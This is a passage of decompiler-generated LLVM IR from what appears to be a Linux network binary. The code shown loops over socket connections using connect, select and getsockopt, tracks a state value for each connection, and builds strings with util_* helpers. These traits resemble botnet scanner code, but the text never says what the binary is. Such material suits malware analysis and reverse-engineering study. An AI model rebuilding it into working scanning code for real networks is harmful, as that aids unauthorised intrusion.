  %v4_8048d72 = inttoptr i32 %v3_8048d72 to i16*
  store i16 %v1_8048d72, i16* %v4_8048d72, align 2
  %v0_8048d7a = load i32, i32* @esp, align 4
  %v1_8048d7a = add i32 %v0_8048d7a, 20900
  %v2_8048d7a = inttoptr i32 %v1_8048d7a to i16*
  store i16 2, i16* %v2_8048d7a, align 2
  %v0_8048d84 = load i32, i32* @esp, align 4
  %v9_8048d84 = icmp eq i32 %v0_8048d84, -28
  store i1 %v9_8048d84, i1* %zf.global-to-local, align 1
  %v0_8048d87 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8048d87 = load i32, i32* @esi, align 4
  %v2_8048d87 = add i32 %v1_8048d87, -8
  %v3_8048d87 = inttoptr i32 %v2_8048d87 to i32*
  store i32 %v0_8048d87, i32* %v3_8048d87, align 4
  %v0_8048d8a = load i32, i32* @esi, align 4
  %v1_8048d8a = add i32 %v0_8048d8a, -12
  %v2_8048d8a = inttoptr i32 %v1_8048d8a to i8*
  store i8 2, i8* %v2_8048d8a, align 1
  %v0_8048d8e = load i32, i32* @esp, align 4
  %v1_8048d8e = add i32 %v0_8048d8e, -4
  %v2_8048d8e = inttoptr i32 %v1_8048d8e to i32*
  store i32 16, i32* %v2_8048d8e, align 4
  %v1_8048d90 = add i32 %v0_8048d8e, 20872
  store i32 %v1_8048d90, i32* %eax.global-to-local, align 4
  %v2_8048d97 = add i32 %v0_8048d8e, -8
  %v3_8048d97 = inttoptr i32 %v2_8048d97 to i32*
  store i32 %v1_8048d90, i32* %v3_8048d97, align 4
  %v0_8048d98 = load i32, i32* @esi, align 4
  %v1_8048d98 = add i32 %v0_8048d98, -16
  %v2_8048d98 = inttoptr i32 %v1_8048d98 to i32*
  %v3_8048d98 = load i32, i32* %v2_8048d98, align 4
  store i32 %v3_8048d98, i32* @edi, align 4
  %v2_8048d9b = add i32 %v0_8048d8e, -12
  %v3_8048d9b = inttoptr i32 %v2_8048d9b to i32*
  store i32 %v3_8048d98, i32* %v3_8048d9b, align 4
  %v3_8048d9c = call i32 @__libc_connect(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8048d9c, i32* %eax.global-to-local, align 4
  %v0_8048da1 = load i32, i32* @esi, align 4
  %v1_8048da1 = add i32 %v0_8048da1, -16
  %v2_8048da1 = inttoptr i32 %v1_8048da1 to i32*
  %v3_8048da1 = load i32, i32* %v2_8048da1, align 4
  %v1_8048da6 = urem i32 %v3_8048da1, 32
  store i32 %v1_8048da6, i32* %eax.global-to-local, align 4
  %v2_8048da9 = udiv i32 %v3_8048da1, 32
  store i32 %v2_8048da9, i32* %edx.global-to-local, align 4
  %v0_8048dac = load i32, i32* @esp, align 4
  %v2_8048dac = mul nuw nsw i32 %v2_8048da9, 4
  %v3_8048dac = add nuw nsw i32 %v2_8048dac, 20628
  %v4_8048dac = add i32 %v3_8048dac, %v0_8048dac
  %v5_8048dac = inttoptr i32 %v4_8048dac to i32*
  %v6_8048dac = load i32, i32* %v5_8048dac, align 4
  %v9_8048dac = shl i32 1, %v1_8048da6
  %v12_8048dac = or i32 %v6_8048dac, %v9_8048dac
  store i32 %v12_8048dac, i32* %v5_8048dac, align 4
  %v0_8048db4 = load i32, i32* @esp, align 4
  %v1_8048db4 = add i32 %v0_8048db4, 16
  %v0_8048db7 = load i32, i32* @esi, align 4
  %v1_8048db7 = add i32 %v0_8048db7, -16
  %v2_8048db7 = inttoptr i32 %v1_8048db7 to i32*
  %v3_8048db7 = load i32, i32* %v2_8048db7, align 4
  store i32 %v3_8048db7, i32* %eax.global-to-local, align 4
  %v2_8048dba = add i32 %v0_8048db4, 108
  %v3_8048dba = inttoptr i32 %v2_8048dba to i32*
  %v4_8048dba = load i32, i32* %v3_8048dba, align 4
  %v5_8048dba = sub i32 %v3_8048db7, %v4_8048dba
  %v11_8048dba = xor i32 %v4_8048dba, %v3_8048db7
  %v12_8048dba = xor i32 %v5_8048dba, %v3_8048db7
  %v13_8048dba = and i32 %v12_8048dba, %v11_8048dba
  %v14_8048dba = icmp slt i32 %v13_8048dba, 0
  %v15_8048dba = icmp eq i32 %v5_8048dba, 0
  store i1 %v15_8048dba, i1* %zf.global-to-local, align 1
  %v16_8048dba = icmp slt i32 %v5_8048dba, 0
  %v3_8048dbe = icmp ne i1 %v16_8048dba, %v14_8048dba
  %v4_8048dbe = or i1 %v15_8048dba, %v3_8048dbe
  br i1 %v4_8048dbe, label %dec_label_pc_8048ca2, label %dec_label_pc_8048dc4

dec_label_pc_8048dc4:                             ; preds = %dec_label_pc_8049798, %dec_label_pc_8049773, %dec_label_pc_8049548, %dec_label_pc_80494f5, %dec_label_pc_8049480, %dec_label_pc_8048d1c
  %v1_8048dcc = phi i32 [ %v1_80497ae, %dec_label_pc_8049798 ], [ %v1_8049789, %dec_label_pc_8049773 ], [ %v1_804955e, %dec_label_pc_8049548 ], [ %v1_804950b, %dec_label_pc_80494f5 ], [ %v1_80494c5, %dec_label_pc_8049480 ], [ %v1_8048db4, %dec_label_pc_8048d1c ]
  %v0_8048dc6 = phi i32 [ %v0_80497ab, %dec_label_pc_8049798 ], [ %v0_8049786, %dec_label_pc_8049773 ], [ %v0_804955b, %dec_label_pc_8049548 ], [ %v0_8049508, %dec_label_pc_80494f5 ], [ %v0_80494c8, %dec_label_pc_8049480 ], [ %v0_8048db7, %dec_label_pc_8048d1c ]
  %v0_8048dc4 = phi i32 [ %v3_80497ab, %dec_label_pc_8049798 ], [ %v3_8049786, %dec_label_pc_8049773 ], [ %v3_804955b, %dec_label_pc_8049548 ], [ %v3_8049508, %dec_label_pc_80494f5 ], [ %v3_80494c8, %dec_label_pc_8049480 ], [ %v3_8048db7, %dec_label_pc_8048d1c ]
  %v1_8048dc4 = add i32 %v0_8048dc4, 1
  store i32 %v1_8048dc4, i32* %eax.global-to-local, align 4
  %v0_8048dc5 = load i32, i32* @ebp, align 4
  %v1_8048dc5 = add i32 %v0_8048dc5, 1
  store i32 %v1_8048dc5, i32* @ebp, align 4
  %v1_8048dc6 = add i32 %v0_8048dc6, 3140
  store i32 %v1_8048dc6, i32* @esi, align 4
  %v2_8048dcc = add i32 %v1_8048dcc, 92
  %v3_8048dcc = inttoptr i32 %v2_8048dcc to i32*
  store i32 %v1_8048dc4, i32* %v3_8048dcc, align 4
  %v0_8048dd0 = load i32, i32* @ebp, align 4
  %v1_8048dd0 = load i32, i32* @esp, align 4
  %v2_8048dd0 = add i32 %v1_8048dd0, 104
  %v3_8048dd0 = inttoptr i32 %v2_8048dd0 to i32*
  %v4_8048dd0 = load i32, i32* %v3_8048dd0, align 4
  %v15_8048dd0 = icmp eq i32 %v0_8048dd0, %v4_8048dd0
  store i1 %v15_8048dd0, i1* %zf.global-to-local, align 1
  %v1_8048dd4 = icmp eq i1 %v15_8048dd0, false
  br i1 %v1_8048dd4, label %dec_label_pc_8048cb3, label %dec_label_pc_8048dda

dec_label_pc_8048dda:                             ; preds = %dec_label_pc_8048dc4, %dec_label_pc_8048ca2
  %v0_8048de6 = phi i32 [ %v1_8048dd0, %dec_label_pc_8048dc4 ], [ %v1_8048ca9, %dec_label_pc_8048ca2 ]
  %v1_8048dda = add i32 %v0_8048de6, 92
  %v2_8048dda = inttoptr i32 %v1_8048dda to i32*
  %v3_8048dda = load i32, i32* %v2_8048dda, align 4
  store i32 %v3_8048dda, i32* %eax.global-to-local, align 4
  %v1_8048dde = icmp eq i32 %v3_8048dda, 0
  store i1 %v1_8048dde, i1* %zf.global-to-local, align 1
  br i1 %v1_8048dde, label %dec_label_pc_8048c1a, label %dec_label_pc_8048de6

dec_label_pc_8048de6:                             ; preds = %dec_label_pc_8048dda
  %v1_8048de6 = add i32 %v0_8048de6, 20888
  %v2_8048de6 = inttoptr i32 %v1_8048de6 to i32*
  store i32 0, i32* %v2_8048de6, align 4
  %v0_8048df1 = load i32, i32* @esp, align 4
  %v1_8048df1 = add i32 %v0_8048df1, 20884
  %v2_8048df1 = inttoptr i32 %v1_8048df1 to i32*
  store i32 1, i32* %v2_8048df1, align 4
  %v0_8048dfc = load i32, i32* @esp, align 4
  %v9_8048dfc = icmp eq i32 %v0_8048dfc, 12
  store i1 %v9_8048dfc, i1* %zf.global-to-local, align 1
  %v1_8048dff = add i32 %v0_8048dfc, 20884
  store i32 %v1_8048dff, i32* %ecx.global-to-local, align 4
  %v2_8048e06 = add i32 %v0_8048dfc, -16
  %v3_8048e06 = inttoptr i32 %v2_8048e06 to i32*
  store i32 %v1_8048dff, i32* %v3_8048e06, align 4
  %v1_8048e07 = add i32 %v0_8048dfc, -20
  %v2_8048e07 = inttoptr i32 %v1_8048e07 to i32*
  store i32 0, i32* %v2_8048e07, align 4
  %v1_8048e09 = add i32 %v0_8048dfc, 20612
  store i32 %v1_8048e09, i32* %eax.global-to-local, align 4
  %v2_8048e10 = add i32 %v0_8048dfc, -24
  %v3_8048e10 = inttoptr i32 %v2_8048e10 to i32*
  store i32 %v1_8048e09, i32* %v3_8048e10, align 4
  %v1_8048e11 = add i32 %v0_8048dfc, 20740
  store i32 %v1_8048e11, i32* %edx.global-to-local, align 4
  %v2_8048e18 = add i32 %v0_8048dfc, -28
  %v3_8048e18 = inttoptr i32 %v2_8048e18 to i32*
  store i32 %v1_8048e11, i32* %v3_8048e18, align 4
  %v1_8048e19 = add i32 %v0_8048dfc, 92
  %v2_8048e19 = inttoptr i32 %v1_8048e19 to i32*
  %v3_8048e19 = load i32, i32* %v2_8048e19, align 4
  store i32 %v3_8048e19, i32* %eax.global-to-local, align 4
  %v2_8048e1d = add i32 %v0_8048dfc, -32
  %v3_8048e1d = inttoptr i32 %v2_8048e1d to i32*
  store i32 %v3_8048e19, i32* %v3_8048e1d, align 4
  %v0_8048e1e = call i32 @__libc_select()
  store i32 %v0_8048e1e, i32* %eax.global-to-local, align 4
  %v0_8048e23 = load i32, i32* @esp, align 4
  %v9_8048e23 = icmp eq i32 %v0_8048e23, -20
  store i1 %v9_8048e23, i1* %zf.global-to-local, align 1
  store i32 %v0_8048e1e, i32* @ebx, align 4
  %v1_8048e28 = add i32 %v0_8048e23, 16
  %v2_8048e28 = inttoptr i32 %v1_8048e28 to i32*
  store i32 0, i32* %v2_8048e28, align 4
  %v2_8048e2a = call i32 @__GI_time(i32* %v1_8048c1f)
  store i32 %v2_8048e2a, i32* %eax.global-to-local, align 4
  %v1_8048e2f = load i32, i32* @esp, align 4
  %v2_8048e2f = add i32 %v1_8048e2f, 72
  %v3_8048e2f = inttoptr i32 %v2_8048e2f to i32*
  store i32 %v2_8048e2a, i32* %v3_8048e2f, align 4
  %v0_8048e33 = load i32, i32* @esp, align 4
  %v1_8048e33 = add i32 %v0_8048e33, 16
  %v1_8048e36 = icmp eq i32 %v0_8048e1e, 0
  store i1 %v1_8048e36, i1* %zf.global-to-local, align 1
  %tmp121 = icmp slt i32 %v0_8048e1e, 1
  br i1 %tmp121, label %dec_label_pc_8048c1a, label %dec_label_pc_8048e3e

dec_label_pc_8048e3e:                             ; preds = %dec_label_pc_8048de6
  %v1_8048e3e = add i32 %v0_8048e33, 52
  %v2_8048e3e = inttoptr i32 %v1_8048e3e to i32*
  %v3_8048e3e = load i32, i32* %v2_8048e3e, align 4
  store i32 %v3_8048e3e, i32* @edi, align 4
  %v1_8048e42 = add i32 %v0_8048e33, 128
  %v2_8048e42 = inttoptr i32 %v1_8048e42 to i32*
  store i32 0, i32* %v2_8048e42, align 4
  %v1_8048ea9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e9d

dec_label_pc_8048e50:                             ; preds = %dec_label_pc_8048eb2, %dec_label_pc_8048f0e
  %v2_8048e58 = phi i32 [ %v4_8048ec4, %dec_label_pc_8048eb2 ], [ %v0_8048f1b, %dec_label_pc_8048f0e ]
  %v7_8048e50 = phi i32 [ %v1_8048eb9, %dec_label_pc_8048eb2 ], [ %v1_8048f22, %dec_label_pc_8048f0e ]
  %v1_8048e50 = phi i32 [ %v2_8048eb6, %dec_label_pc_8048eb2 ], [ %v2_8048f1f, %dec_label_pc_8048f0e ]
  %v1_80497bd = phi i32 [ %v0_8048ebc, %dec_label_pc_8048eb2 ], [ %v0_8048e50.pre, %dec_label_pc_8048f0e ]
  %v2_8048e50 = mul nuw nsw i32 %v1_8048e50, 4
  %v3_8048e50 = add i32 %v1_80497bd, 20740
  %v4_8048e50 = add i32 %v3_8048e50, %v2_8048e50
  %v5_8048e50 = inttoptr i32 %v4_8048e50 to i32*
  %v6_8048e50 = load i32, i32* %v5_8048e50, align 4
  %v9_8048e50 = shl i32 1, %v7_8048e50
  %v10_8048e50 = and i32 %v6_8048e50, %v9_8048e50
  %v11_8048e50 = icmp ne i32 %v10_8048e50, 0
  %v1_8048e58 = zext i1 %v11_8048e50 to i32
  %v3_8048e58 = and i32 %v2_8048e58, -256
  %v4_8048e58 = or i32 %v1_8048e58, %v3_8048e58
  store i32 %v4_8048e58, i32* %eax.global-to-local, align 4
  %v4_8048e5b = icmp eq i1 %v11_8048e50, false
  store i1 %v4_8048e5b, i1* %zf.global-to-local, align 1
  br i1 %v4_8048e5b, label %dec_label_pc_8048e80, label %dec_label_pc_8048e5f

dec_label_pc_8048e5f:                             ; preds = %dec_label_pc_8048e50
  %v0_8048e5f = load i32, i32* @edi, align 4
  %v1_8048e5f = add i32 %v0_8048e5f, -1448
  %v2_8048e5f = inttoptr i32 %v1_8048e5f to i8*
  %v3_8048e5f = load i8, i8* %v2_8048e5f, align 1
  %v4_8048e5f = zext i8 %v3_8048e5f to i32
  %v7_8048e5f = or i32 %v4_8048e5f, %v3_8048e58
  store i32 %v7_8048e5f, i32* @eax, align 4
  %v10_8048e65 = icmp eq i8 %v3_8048e5f, 6
  store i1 %v10_8048e65, i1* %zf.global-to-local, align 1
  br i1 %v10_8048e65, label %dec_label_pc_80497bd, label %dec_label_pc_8048e6d

dec_label_pc_8048e6d:                             ; preds = %dec_label_pc_8048e5f
  %v10_8048e6d = icmp eq i8 %v3_8048e5f, 7
  store i1 %v10_8048e6d, i1* %zf.global-to-local, align 1
  br i1 %v10_8048e6d, label %dec_label_pc_804956d, label %dec_label_pc_8048e75

dec_label_pc_8048e75:                             ; preds = %dec_label_pc_8048e6d
  %v10_8048e75 = icmp eq i8 %v3_8048e5f, 10
  store i1 %v10_8048e75, i1* %zf.global-to-local, align 1
  br i1 %v10_8048e75, label %dec_label_pc_8049d73, label %dec_label_pc_8048e80

dec_label_pc_8048e80:                             ; preds = %dec_label_pc_8049670, %dec_label_pc_8049f36, %dec_label_pc_8048e75, %dec_label_pc_8049820, %dec_label_pc_8048e50, %dec_label_pc_8048e9d, %dec_label_pc_8049db5, %dec_label_pc_8049ef4, %dec_label_pc_8049520, %dec_label_pc_8049dc2, %dec_label_pc_8049d67, %dec_label_pc_804a221, %dec_label_pc_804a1a7, %dec_label_pc_804a149
  %v0_8048e80 = load i32, i32* @esp, align 4
  %v1_8048e80 = add i32 %v0_8048e80, 112
  %v2_8048e80 = inttoptr i32 %v1_8048e80 to i32*
  %v3_8048e80 = load i32, i32* %v2_8048e80, align 4
  store i32 %v3_8048e80, i32* %eax.global-to-local, align 4
  %v1_8048e84 = add i32 %v0_8048e80, 104
  %v2_8048e84 = inttoptr i32 %v1_8048e84 to i32*
  %v3_8048e84 = load i32, i32* %v2_8048e84, align 4
  store i32 %v3_8048e84, i32* %edx.global-to-local, align 4
  %v1_8048e88 = add i32 %v3_8048e80, 1
  store i32 %v1_8048e88, i32* %eax.global-to-local, align 4
  %v0_8048e89 = load i32, i32* @edi, align 4
  %v1_8048e89 = add i32 %v0_8048e89, 3140
  store i32 %v1_8048e89, i32* @edi, align 4
  store i32 %v1_8048e88, i32* %v2_8048e80, align 4
  %v0_8048e93 = load i32, i32* @esp, align 4
  %v1_8048e93 = add i32 %v0_8048e93, 112
  %v2_8048e93 = inttoptr i32 %v1_8048e93 to i32*
  %v3_8048e93 = load i32, i32* %v2_8048e93, align 4
  %v4_8048e93 = load i32, i32* %edx.global-to-local, align 4
  %v15_8048e93 = icmp eq i32 %v3_8048e93, %v4_8048e93
  store i1 %v15_8048e93, i1* %zf.global-to-local, align 1
  br i1 %v15_8048e93, label %dec_label_pc_8048c1a, label %dec_label_pc_8048e9d

dec_label_pc_8048e9d:                             ; preds = %dec_label_pc_8048e80, %dec_label_pc_8048e3e
  %v1_8048ea9 = phi i32 [ %v0_8048e93, %dec_label_pc_8048e80 ], [ %v1_8048ea9.pre, %dec_label_pc_8048e3e ]
  %v0_8048e9d = load i32, i32* @edi, align 4
  %v1_8048e9d = add i32 %v0_8048e9d, -1452
  store i32 %v1_8048e9d, i32* %ecx.global-to-local, align 4
  %v2_8048ea3 = inttoptr i32 %v1_8048e9d to i32*
  %v3_8048ea3 = load i32, i32* %v2_8048ea3, align 4
  store i32 %v3_8048ea3, i32* @ebx, align 4
  %v2_8048ea9 = add i32 %v1_8048ea9, 96
  %v3_8048ea9 = inttoptr i32 %v2_8048ea9 to i32*
  store i32 %v1_8048e9d, i32* %v3_8048ea9, align 4
  %v0_8048ead = load i32, i32* @ebx, align 4
  %v10_8048ead = icmp eq i32 %v0_8048ead, -1
  store i1 %v10_8048ead, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ead, label %dec_label_pc_8048e80, label %dec_label_pc_8048eb2

dec_label_pc_8048eb2:                             ; preds = %dec_label_pc_8048e9d
  %v2_8048eb6 = udiv i32 %v0_8048ead, 32
  store i32 %v2_8048eb6, i32* %edx.global-to-local, align 4
  %v1_8048eb9 = urem i32 %v0_8048ead, 32
  store i32 %v1_8048eb9, i32* %ecx.global-to-local, align 4
  %v0_8048ebc = load i32, i32* @esp, align 4
  %v2_8048ebc = mul nuw nsw i32 %v2_8048eb6, 4
  %v3_8048ebc = add nuw nsw i32 %v2_8048ebc, 20612
  %v4_8048ebc = add i32 %v3_8048ebc, %v0_8048ebc
  %v5_8048ebc = inttoptr i32 %v4_8048ebc to i32*
  %v6_8048ebc = load i32, i32* %v5_8048ebc, align 4
  %v9_8048ebc = shl i32 1, %v1_8048eb9
  %v10_8048ebc = and i32 %v6_8048ebc, %v9_8048ebc
  %v11_8048ebc = icmp ne i32 %v10_8048ebc, 0
  %v1_8048ec4 = zext i1 %v11_8048ebc to i32
  %v2_8048ec4 = load i32, i32* %eax.global-to-local, align 4
  %v3_8048ec4 = and i32 %v2_8048ec4, -256
  %v4_8048ec4 = or i32 %v1_8048ec4, %v3_8048ec4
  store i32 %v4_8048ec4, i32* %eax.global-to-local, align 4
  %v4_8048ec7 = icmp eq i1 %v11_8048ebc, false
  store i1 %v4_8048ec7, i1* %zf.global-to-local, align 1
  br i1 %v4_8048ec7, label %dec_label_pc_8048e50, label %dec_label_pc_8048ecb

dec_label_pc_8048ecb:                             ; preds = %dec_label_pc_8048eb2
  %v1_8048ecb = add i32 %v0_8048ebc, 20896
  %v2_8048ecb = inttoptr i32 %v1_8048ecb to i32*
  store i32 0, i32* %v2_8048ecb, align 4
  %v0_8048ed6 = load i32, i32* @esp, align 4
  %v1_8048ed6 = add i32 %v0_8048ed6, 20892
  %v2_8048ed6 = inttoptr i32 %v1_8048ed6 to i32*
  store i32 4, i32* %v2_8048ed6, align 4
  %v0_8048ee1 = load i32, i32* @esp, align 4
  %v9_8048ee1 = icmp eq i32 %v0_8048ee1, 12
  store i1 %v9_8048ee1, i1* %zf.global-to-local, align 1
  %v1_8048ee4 = add i32 %v0_8048ee1, 20892
  store i32 %v1_8048ee4, i32* %eax.global-to-local, align 4
  %v2_8048eeb = add i32 %v0_8048ee1, -16
  %v3_8048eeb = inttoptr i32 %v2_8048eeb to i32*
  store i32 %v1_8048ee4, i32* %v3_8048eeb, align 4
  %v1_8048eec = add i32 %v0_8048ee1, 20896
  store i32 %v1_8048eec, i32* %edx.global-to-local, align 4
  %v2_8048ef3 = add i32 %v0_8048ee1, -20
  %v3_8048ef3 = inttoptr i32 %v2_8048ef3 to i32*
  store i32 %v1_8048eec, i32* %v3_8048ef3, align 4
  %v1_8048ef4 = add i32 %v0_8048ee1, -24
  %v2_8048ef4 = inttoptr i32 %v1_8048ef4 to i32*
  store i32 4, i32* %v2_8048ef4, align 4
  %v1_8048ef6 = add i32 %v0_8048ee1, -28
  %v2_8048ef6 = inttoptr i32 %v1_8048ef6 to i32*
  store i32 1, i32* %v2_8048ef6, align 4
  %v0_8048ef8 = load i32, i32* @ebx, align 4
  %v2_8048ef8 = add i32 %v0_8048ee1, -32
  %v3_8048ef8 = inttoptr i32 %v2_8048ef8 to i32*
  store i32 %v0_8048ef8, i32* %v3_8048ef8, align 4
  %v0_8048ef9 = call i32 @getsockopt()
  store i32 %v0_8048ef9, i32* %eax.global-to-local, align 4
  %v0_8048efe = load i32, i32* @esp, align 4
  %v2_8048f01 = add i32 %v0_8048efe, 20928
  %v3_8048f01 = inttoptr i32 %v2_8048f01 to i32*
  %v4_8048f01 = load i32, i32* %v3_8048f01, align 4
  %v5_8048f01 = or i32 %v4_8048f01, %v0_8048ef9
  %v6_8048f01 = icmp eq i32 %v5_8048f01, 0
  store i1 %v6_8048f01, i1* %zf.global-to-local, align 1
  store i32 %v5_8048f01, i32* @eax, align 4
  %v1_8048f08 = icmp eq i1 %v6_8048f01, false
  br i1 %v1_8048f08, label %dec_label_pc_8049520, label %dec_label_pc_8048f0e

dec_label_pc_8048f0e:                             ; preds = %dec_label_pc_8048ecb
  %v0_8048f0e = load i32, i32* @edi, align 4
  %v1_8048f0e = add i32 %v0_8048f0e, -1452
  %v2_8048f0e = inttoptr i32 %v1_8048f0e to i32*
  %v3_8048f0e = load i32, i32* %v2_8048f0e, align 4
  store i32 %v3_8048f0e, i32* %eax.global-to-local, align 4
  %v1_8048f14 = add i32 %v0_8048f0e, -1448
  %v2_8048f14 = inttoptr i32 %v1_8048f14 to i8*
  store i8 4, i8* %v2_8048f14, align 1
  %v0_8048f1b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f1f = udiv i32 %v0_8048f1b, 32
  store i32 %v2_8048f1f, i32* %edx.global-to-local, align 4
  %v1_8048f22 = urem i32 %v0_8048f1b, 32
  %v2_8048f22 = icmp eq i32 %v1_8048f22, 0
  store i1 %v2_8048f22, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f22, i32* %ecx.global-to-local, align 4
  %v0_8048e50.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048e50

dec_label_pc_8048f30:                             ; preds = %dec_label_pc_8048cb3
  %v1_8048f30 = add i32 %v0_8048cb3, 1440
  %v2_8048f30 = inttoptr i32 %v1_8048f30 to i32*
  %v3_8048f30 = load i32, i32* %v2_8048f30, align 4
  store i32 %v3_8048f30, i32* @ebx, align 4
  %v1_8048f36 = icmp eq i32 %v3_8048f30, 0
  store i1 %v1_8048f36, i1* %zf.global-to-local, align 1
  br i1 %v1_8048f36, label %dec_label_pc_80494da, label %dec_label_pc_8048f3e

dec_label_pc_8048f3e:                             ; preds = %dec_label_pc_8048f30
  store i8 4, i8* %v2_8048cb3, align 1
  %v0_8048f42.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8048f42

dec_label_pc_8048f42:                             ; preds = %dec_label_pc_8048c68, %dec_label_pc_8048f3e
  %v0_8048f42 = phi i32 [ %v0_8048cb3, %dec_label_pc_8048c68 ], [ %v0_8048f42.pre, %dec_label_pc_8048f3e ]
  %v1_8048f42 = add i32 %v0_8048f42, 1448
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  store i32 -1, i32* %v2_8048f42, align 4
  %v0_8048f4c = load i32, i32* @esi, align 4
  %v1_8048f4c = add i32 %v0_8048f4c, 1436
  %v2_8048f4c = inttoptr i32 %v1_8048f4c to i32*
  store i32 0, i32* %v2_8048f4c, align 4
  %v0_8048f56 = load i32, i32* @edi, align 4
  %v1_8048f56 = add i32 %v0_8048f56, 2116
  store i32 %v1_8048f56, i32* @eax, align 4
  %v0_8048f5c = load i32, i32* @ecx, align 4
  %v1_8048f5c = load i32, i32* @esp, align 4
  %v2_8048f5c = add i32 %v1_8048f5c, -4
  %v3_8048f5c = inttoptr i32 %v2_8048f5c to i32*
  store i32 %v0_8048f5c, i32* %v3_8048f5c, align 4
  %v0_8048f5d = load i32, i32* @ecx, align 4
  %v2_8048f5d = add i32 %v1_8048f5c, -8
  %v3_8048f5d = inttoptr i32 %v2_8048f5d to i32*
  store i32 %v0_8048f5d, i32* %v3_8048f5d, align 4
  %v1_8048f5e = add i32 %v1_8048f5c, -12
  %v2_8048f5e = inttoptr i32 %v1_8048f5e to i32*
  store i32 1024, i32* %v2_8048f5e, align 4
  %v0_8048f63 = load i32, i32* @eax, align 4
  %v2_8048f63 = add i32 %v1_8048f5c, -16
  %v3_8048f63 = inttoptr i32 %v2_8048f63 to i32*
  store i32 %v0_8048f63, i32* %v3_8048f63, align 4
  %v2_8048f64 = call i32 @util_zero(i32 %stack_var_-20888.0, i32 %v3_8048a9f)
  store i32 %v2_8048f64, i32* %eax.global-to-local, align 4
  %v0_8048f69 = load i32, i32* @esi, align 4
  %v1_8048f69 = add i32 %v0_8048f69, 2096
  %v2_8048f69 = inttoptr i32 %v1_8048f69 to i32*
  store i32 0, i32* %v2_8048f69, align 4
  %v0_8048f73 = load i32, i32* @esp, align 4
  %v1_8048f73 = inttoptr i32 %v0_8048f73 to i32*
  %v2_8048f73 = load i32, i32* %v1_8048f73, align 4
  store i32 %v2_8048f73, i32* @eax, align 4
  %v3_8048f73 = add i32 %v0_8048f73, 4
  %v1_8048f74 = inttoptr i32 %v3_8048f73 to i32*
  store i32 10240, i32* %v1_8048f74, align 4
  %v1_8048f7a = add i32 %v0_8048f73, 10388
  store i32 %v1_8048f7a, i32* %edx.global-to-local, align 4
  store i32 %v1_8048f7a, i32* %v1_8048f73, align 4
  %v2_8048f82 = call i32 @util_zero(i32 %stack_var_-20888.0, i32 %v3_8048a9f)
  %v0_8048f87 = load i32, i32* @edi, align 4
  %v1_8048f87 = add i32 %v0_8048f87, 1431
  store i32 %v1_8048f87, i32* %ecx.global-to-local, align 4
  %v1_8048f8d = load i32, i32* @esp, align 4
  %v2_8048f8d = add i32 %v1_8048f8d, 68
  %v3_8048f8d = inttoptr i32 %v2_8048f8d to i32*
  store i32 %v1_8048f87, i32* %v3_8048f8d, align 4
  %v0_8048f91 = load i32, i32* @esp, align 4
  %v1_8048f91 = inttoptr i32 %v0_8048f91 to i32*
  %v1_8048f92 = add i32 %v0_8048f91, 10388
  store i32 %v1_8048f92, i32* %eax.global-to-local, align 4
  store i32 %v1_8048f92, i32* %v1_8048f91, align 4
  %v2_8048f9a = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8048f9a, i32* %eax.global-to-local, align 4
  %v0_8048f9f = load i32, i32* @esp, align 4
  %v1_8048f9f = inttoptr i32 %v0_8048f9f to i32*
  %v2_8048f9f = load i32, i32* %v1_8048f9f, align 4
  store i32 %v2_8048f9f, i32* %ecx.global-to-local, align 4
  %v3_8048f9f = add i32 %v0_8048f9f, 4
  %v1_8048fa0 = inttoptr i32 %v3_8048f9f to i32*
  %v2_8048fa0 = load i32, i32* %v1_8048fa0, align 4
  store i32 %v2_8048fa0, i32* @ebx, align 4
  %v1_8048fa1 = add i32 %v0_8048f9f, 68
  %v2_8048fa1 = inttoptr i32 %v1_8048fa1 to i32*
  %v3_8048fa1 = load i32, i32* %v2_8048fa1, align 4
  store i32 %v3_8048fa1, i32* %v1_8048fa0, align 4
  %v1_8048fa6 = add i32 %v0_8048f9f, 10388
  store i32 %v1_8048fa6, i32* %edx.global-to-local, align 4
  %v2_8048fad = add i32 %v1_8048fa6, %v2_8048f9a
  store i32 %v2_8048fad, i32* @eax, align 4
  store i32 %v2_8048fad, i32* %v1_8048f9f, align 4
  %v3_8048fb1 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8048fb1, i32* %eax.global-to-local, align 4
  %v0_8048fb6 = load i32, i32* @esp, align 4
  %v1_8048fb6 = inttoptr i32 %v0_8048fb6 to i32*
  %v2_8048fb6 = load i32, i32* %v1_8048fb6, align 4
  store i32 %v2_8048fb6, i32* @ebx, align 4
  %v1_8048fb7 = add i32 %v0_8048fb6, 10388
  store i32 %v1_8048fb7, i32* %ecx.global-to-local, align 4
  store i32 %v1_8048fb7, i32* %v1_8048fb6, align 4
  %v2_8048fbf = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8048fbf, i32* %eax.global-to-local, align 4
  %v0_8048fc4 = load i32, i32* @esp, align 4
  %v1_8048fc4 = inttoptr i32 %v0_8048fc4 to i32*
  %v2_8048fc4 = load i32, i32* %v1_8048fc4, align 4
  store i32 %v2_8048fc4, i32* %edx.global-to-local, align 4
  %v3_8048fc4 = add i32 %v0_8048fc4, 4
  %v1_8048fc5 = inttoptr i32 %v3_8048fc4 to i32*
  %v2_8048fc5 = load i32, i32* %v1_8048fc5, align 4
  store i32 %v2_8048fc5, i32* %ecx.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80558fc.14 to i32), i32* %v1_8048fc5, align 4
  %v1_8048fcb = add i32 %v0_8048fc4, 10388
  store i32 %v1_8048fcb, i32* %edx.global-to-local, align 4
  %v2_8048fd2 = add i32 %v1_8048fcb, %v2_8048fbf
  store i32 %v2_8048fd2, i32* @eax, align 4
  store i32 %v2_8048fd2, i32* %v1_8048fc4, align 4
  %v3_8048fd6 = call i32 @util_strcpy(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8048fd6, i32* %eax.global-to-local, align 4
  %v0_8048fdb = load i32, i32* @esp, align 4
  %v1_8048fdb = inttoptr i32 %v0_8048fdb to i32*
